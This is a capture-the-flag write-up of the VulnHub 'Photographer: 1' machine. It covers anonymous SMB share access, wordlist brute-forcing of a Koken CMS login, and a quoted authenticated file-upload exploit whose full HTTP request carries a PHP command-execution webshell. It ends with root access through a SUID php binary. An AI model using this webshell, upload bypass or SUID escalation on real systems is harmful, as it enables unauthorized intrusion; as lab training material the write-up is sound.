#  Photographer: 1 Writeup

Description:
\
This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.

# Exploitation
Let's start with a network scan
```bash
Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.106   08:00:27:04:7e:15      1      60  PCS Systemtechnik GmbH
```
\
Next , Port Scanning
```bash
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
8000/tcp open  http-alt     syn-ack ttl 64
```
\
Next , We start enumerating using smbmap for smb service
```bash
smbmap -H 192.168.0.106                    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.0.106:445       Name: 192.168.0.106             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Samba on Ubuntu
        IPC$                                                    NO ACCESS       IPC Service (photographer server (Samba, Ubuntu))
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                                                               
C:\home\kali\cysec\vulnhub> smbclient //192.168.0.106/sambashare -N
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Mon Jul 20 21:30:07 2020
  ..                                  D        0  Tue Jul 21 05:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> lcd photographer/
smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (163.7 KiloBytes/sec) (average 163.7 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (125961.1 KiloBytes/sec) (average 122561.3 KiloBytes/sec)
```
\
We see a anonymous read of the share "sambashare" and we get 2 files from it.
\
```bash
cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```
\
We see an email here "<daisa@photographer.com>"
\
And the wordpress folder , after unzipping didnt really have a config.php to get any credentials from 
\
So Next , when we open website on port 80 , it shows this page
\
<img width="1671" height="754" alt="image" src="https://github.com/user-attachments/assets/5936fa64-05f8-4389-8778-fd80eaf857a1" />
\
then on page 8080 , it shows this
\
<img width="1470" height="513" alt="image" src="https://github.com/user-attachments/assets/ee0763c9-b0ee-495d-994e-fae369cd6464" />
\
Here it says "koken" , and according to wappalyzer this is the version
\
<img width="167" height="78" alt="image" src="https://github.com/user-attachments/assets/3bfc95e8-ec52-42f3-a862-23d833e385a6" />

\
and using searchsploit gave 
```bash
searchsploit koken
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                                                                                    | php/webapps/48706.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
\
So , we have the exact version , but we need to  login , so we go to /admin 
\
<img width="1228" height="605" alt="image" src="https://github.com/user-attachments/assets/aec85080-9518-4c5a-9176-a7d9e48e6ec0" />
\
And we enter the email we knoew before , but didnt know the password , tried default ones , enumerated a bit more still couldnt find it 
\
Then i used cewl on the mailsent.txt file to get some words to use as passwords
\
Since cewl cant natively get words from a local file , i hosted the file and then used this
```bash
cewl -m 5 http://localhost:9000/mailsent.txt > out_words.txt
```
\
And then i send a request to burpsuite intruder and then run it
\
<img width="1206" height="149" alt="image" src="https://github.com/user-attachments/assets/6cb2078b-1e12-423d-ae7e-b95198242a25" />
\
Here we see that the password "babygirl" is giving different response size , so it must be correct password
\
After we login , we see this dashboard
\
<img width="1671" height="744" alt="image" src="https://github.com/user-attachments/assets/164e5d8f-3f67-406a-b8e5-a39e1f7213fe" />
\
Now , since we are authenticated , we can look at the exploit previously found using searchsploit
```bash
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
# Date: 2020-07-15
# Exploit Author: v1n1v131r4
# Vendor Homepage: http://koken.me/
# Software Link: https://www.softaculous.com/apps/cms/Koken
# Version: 0.22.24
# Tested on: Linux
# PoC: https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md

The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.

Steps to exploit:

1. Create a malicious PHP file with this content:

   <?php system($_GET['cmd']);?>

2. Save as "image.php.jpg"

3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.

4. On Burp, rename your file to "image.php"


POST /koken/api.php?/content HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/koken/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------2391361183188899229525551
Content-Length: 1043
Connection: close
Cookie: PHPSESSID= [Cookie value here]

-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="name"

image.php
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunk"

0
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunks"

1
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="upload_session_start"

1594831856
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="visibility"

public
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="license"

all
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="max_download"

none
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------2391361183188899229525551--



5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.
```
\
So , after following the instructions from this exploit ( i put a php reverse shell script in the uploaded file , rather than the one shown in the exploit ),
i get a reverse shell by accessing it at the download path 
\
Then i get user.txt file at daisa's home directory
```bash
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```
\
Then i check suid binaries
```bash
www-data@photographer:/tmp$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```
\
And i see "/usr/bin/php7.2" which is very powerful , so there can be multiple ways to get root shell with SUID
\
Then i go to "https://gtfobins.org/gtfobins/php/#shell" to get syntax for priv esc with suid 
there were 4 different syntaxes , but only this worked for me
```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```
\
But here th emain thing to notice is , the current php we are using is NOT the one which has SUID 
```bash
www-data@photographer:/tmp$ which php 
/usr/bin/php
```
\
So it is necesarry to use the absolute path of the php7.2 to run it as suid , The final command to get root shell is
```bash
www-data@photographer:/tmp$ /usr/bin/php7.2 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
\
Then i get the final flag at /root/proof.txt
```bash
# cat pro*
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
```
\
The End , Thank you for reading till here
